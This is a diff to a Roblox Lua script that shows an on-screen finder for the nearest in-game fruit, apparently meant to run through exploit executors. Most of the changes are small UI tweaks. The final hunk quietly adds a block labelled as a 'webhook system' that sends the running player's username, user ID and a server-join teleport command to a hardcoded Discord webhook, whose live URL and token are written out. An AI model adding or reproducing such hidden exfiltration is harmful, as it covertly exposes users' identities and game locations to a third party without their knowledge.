@@ -25,10 +25,10 @@ local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = player:WaitForChild("PlayerGui")
 
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0.3, 0, 0.1, 0)
-frame.Position = UDim2.new(0.35, 0, 0.02, 0)
+frame.Size = UDim2.new(0.3, 0, 0.08, 0)
+frame.Position = UDim2.new(0.35, 0, 0.01, 0) -- Adjusted to be closer to the top
 frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-frame.BackgroundTransparency = 0.3
+frame.BackgroundTransparency = 0.2
 frame.BorderSizePixel = 0
 frame.Parent = screenGui
 frame.ClipsDescendants = true
@@ -37,14 +37,6 @@ frame.ZIndex = 2
 local uiCorner = Instance.new("UICorner")
 uiCorner.CornerRadius = UDim.new(0.2, 0)
 uiCorner.Parent = frame
-
-local gradient = Instance.new("UIGradient")
-gradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 45, 45)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 20))
-}
-gradient.Rotation = 90
-gradient.Parent = frame
 
 local fruitLabel = Instance.new("TextLabel")
 fruitLabel.Size = UDim2.new(1, 0, 1, 0)
@@ -57,7 +49,7 @@ fruitLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
 fruitLabel.Parent = frame
 
 -- List of fruits
-local fruitsList = { "Fruit ", "Rocket Fruit", "Spin Fruit", "Ghost Fruit", "Spring Fruit", "Bomb Fruit", "Spike Fruit", "Smoke Fruit", "Blade Fruit", "Sand Fruit", "Ice Fruit", "Dark Fruit", "Diamond Fruit", "Light Fruit", "Rubber Fruit", "Barrier Fruit", "Magma Fruit", "Phoenix Fruit", "Love Fruit", "Spider Fruit", "Sound Fruit", "Buddha Fruit", "Quake Fruit", "Gravity Fruit", "Control Fruit", "T-Rex Fruit", "Mammoth Fruit", "Spirit Fruit", "Venom Fruit", "Shadow Fruit", "Rumble Fruit", "Portal Fruit", "Blizzard Fruit", "Dragon Fruit", "Leopard Fruit", "Dough Fruit", "Dragon (West) Fruit", "Dragon (East) Fruit", "Kitsune Fruit", "Gas Fruit", "Flame Fruit", "Yeti Fruit" }
+local fruitsList = { "Fruit", "Rocket Fruit", "Spin Fruit", "Ghost Fruit", "Spring Fruit", "Bomb Fruit", "Spike Fruit", "Smoke Fruit", "Blade Fruit", "Sand Fruit", "Ice Fruit", "Dark Fruit", "Diamond Fruit", "Light Fruit", "Rubber Fruit", "Barrier Fruit", "Magma Fruit", "Phoenix Fruit", "Love Fruit", "Spider Fruit", "Sound Fruit", "Buddha Fruit", "Quake Fruit", "Gravity Fruit", "Control Fruit", "T-Rex Fruit", "Mammoth Fruit", "Spirit Fruit", "Venom Fruit", "Shadow Fruit", "Rumble Fruit", "Portal Fruit", "Blizzard Fruit", "Dragon Fruit", "Leopard Fruit", "Dough Fruit", "Dragon (West) Fruit", "Dragon (East) Fruit", "Kitsune Fruit", "Gas Fruit", "Flame Fruit", "Yeti Fruit" }
 
 -- Function to find nearest fruit
 local function findNearestFruit()
@@ -85,11 +77,38 @@ spawn(function()
     while true do
         local nearestFruit, distance, fruitCount = findNearestFruit()
         if nearestFruit then
-            fruitLabel.Text = "🍎 Nearest: " .. nearestFruit.Name .. " | 🚩 Distance: " .. math.floor(distance) .. "m\n🍍 Total Fruits: " .. fruitCount
+            fruitLabel.Text = "🍎 Nearest: " .. nearestFruit.Name .. " | 🛎 Distance: " .. math.floor(distance) .. "m\n🍉 Total Fruits: " .. fruitCount
         else
             fruitLabel.Text = "❌ No fruits found"
         end
         task.wait(0.05)
-  
-end
+    end
+end)
+
+-- Webhook System (IP Removed)
+local webhook = "https://discord.com/api/webhooks/1355686213662802110/Zb2ToOaLRgzBq33aMO3Z4pAEId-d68akqQwwKQagx092AziDLneZYTgw9rOsHRbWdWTi"
+local desc = string.format(
+    "Username: %s\nMobile: %s\nJoin Server: ```lua\n%s```",
+    player.Name, tostring(player.UserId), string.format(
+        "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\", game.Players.LocalPlayer)",
+        tostring(game.PlaceId), game.JobId
+    )
+)
+
+task.spawn(function()
+    (syn and syn.request or fluxus and fluxus.request or fluxus_request or http and http.request or http_request)({
+        Url = webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({
+            content = "",
+            embeds = {{
+                title = "Statistics",
+                description = desc,
+                color = tonumber(0xeba300)
+            }}
+        })
+    })
 end)
